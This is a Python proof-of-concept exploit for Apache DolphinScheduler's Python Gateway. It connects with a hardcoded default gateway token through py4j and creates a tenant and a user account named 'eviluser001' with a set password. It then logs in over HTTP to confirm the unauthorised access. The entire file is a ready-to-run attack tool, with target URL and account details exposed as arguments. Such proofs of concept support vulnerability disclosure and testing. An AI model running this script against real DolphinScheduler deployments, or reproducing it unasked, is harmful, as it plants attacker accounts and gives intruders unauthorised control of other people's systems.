#!/usr/bin/env python3
"""
Apache DolphinScheduler Python Gateway default credential unauthenticated access PoC

Dependencies:
  pip install py4j
"""

import argparse
import json
import sys
import urllib.parse
import urllib.request


def parse_target(url: str):
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in {"http", "https"}:
        raise ValueError("target URL must start with http:// or https://")
    host = parsed.hostname
    if not host:
        raise ValueError("invalid target URL")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    base_url = f"{parsed.scheme}://{host}"
    if parsed.port:
        base_url = f"{parsed.scheme}://{host}:{parsed.port}"
    return parsed.scheme, host, port, base_url


def create_accounts(args, gateway_host):
    try:
        import importlib

        py4j_gateway = importlib.import_module("py4j.java_gateway")
        JavaGateway = py4j_gateway.JavaGateway
        GatewayParameters = py4j_gateway.GatewayParameters
    except ImportError as import_error:
        print("[!] Please install py4j first: pip install py4j")
        raise SystemExit(import_error)

    gateway = JavaGateway(
        gateway_parameters=GatewayParameters(
            address=gateway_host,
            port=args.gateway_port,
            auth_token=args.auth_token,
        )
    )
    entry_point = gateway.entry_point

    tenant = entry_point.createTenant(
        args.tenant_code, args.tenant_desc, args.queue_name
    )
    print(f"[+] Created/loaded tenant id={tenant.getId()} code={args.tenant_code}")

    user = entry_point.createUser(
        args.username,
        args.password,
        args.email,
        "",
        args.tenant_code,
        args.queue_name,
        1,
    )
    print(f"[+] Created/loaded user id={user.getId()} username={args.username}")


def login_http(args, base_url):
    data = urllib.parse.urlencode(
        {"userName": args.username, "userPassword": args.password}
    ).encode()

    req = urllib.request.Request(
        f"{base_url}/dolphinscheduler/login",
        data=data,
        method="POST",
    )
    with urllib.request.urlopen(req) as resp:
        body = resp.read().decode()
        print(f"[+] HTTP login response status={resp.status}")
        print(f"[+] Body: {body}")
        parsed = json.loads(body)
        if parsed.get("code") == 0:
            print("[+] Login succeeded, vulnerability confirmed")
        else:
            print("[-] Login failed, check payload or environment")


def main():
    parser = argparse.ArgumentParser(
        description="Apache DolphinScheduler Python Gateway unauthenticated access PoC"
    )
    parser.add_argument(
        "target_url",
        help="DolphinScheduler Web URL, e.g. http://localhost:12345",
    )
    parser.add_argument("--gateway-host", default=None, help="Python Gateway host (default: target host)")
    parser.add_argument("--gateway-port", type=int, default=25333, help="Python Gateway port")
    parser.add_argument(
        "--auth-token",
        default="jwUDzpLsNKEFER4*a8gruBH_GsAurNxU7A@Xc",
        help="Python Gateway auth token",
    )
    parser.add_argument("--tenant-code", default="eviltenant001", help="tenant code to create")
    parser.add_argument("--tenant-desc", default="created via python gateway poc", help="tenant description")
    parser.add_argument("--queue-name", default="evilqueue001", help="queue name")
    parser.add_argument("--username", default="eviluser001", help="username to create")
    parser.add_argument("--password", default="Passw0rd!", help="user password")
    parser.add_argument("--email", default="evil@example.com", help="user email")
    args = parser.parse_args()

    try:
        _, host, _, base_url = parse_target(args.target_url)
        gateway_host = args.gateway_host or host
        create_accounts(args, gateway_host=gateway_host)
        login_http(args, base_url=base_url)
    except Exception as exc:
        print(f"[!] Poc failed: {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()

